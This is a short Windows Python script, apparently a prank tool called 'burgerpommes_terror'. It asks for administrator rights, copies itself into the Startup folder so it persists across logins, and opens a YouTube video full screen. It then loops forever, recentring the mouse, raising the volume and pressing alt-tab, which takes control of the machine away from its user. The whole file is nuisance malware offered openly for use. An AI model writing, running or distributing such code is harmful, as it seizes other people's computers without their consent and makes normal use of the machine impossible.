import webbrowser
import pyautogui
import time
import os
import sys
import ctypes
import shutil

def install_and_admin():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        os._exit(0)

    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_name = os.path.basename(sys.argv[0])
    destination = os.path.join(startup_path, script_name)

    if not os.path.exists(destination):
        try:
            shutil.copy(sys.argv[0], destination)
            print("Autostart installiert.")
        except:
            pass

def burgerpommes_terror():
    url = "https://www.youtube.com/watch?v=ueqInmVvP1E"
    
    webbrowser.open(url)
    time.sleep(8)
    
    pyautogui.press('f')

    print("Dauerschleife aktiv. Viel Spaß.")
    
    while True:
        try:
            w, h = pyautogui.size()
            pyautogui.moveTo(w // 2, h // 2)

            pyautogui.press('volumeup')

            pyautogui.hotkey('alt', 'tab')

            time.sleep(0.5)
        except:
            continue

if __name__ == "__main__":
    install_and_admin()
    burgerpommes_terror()
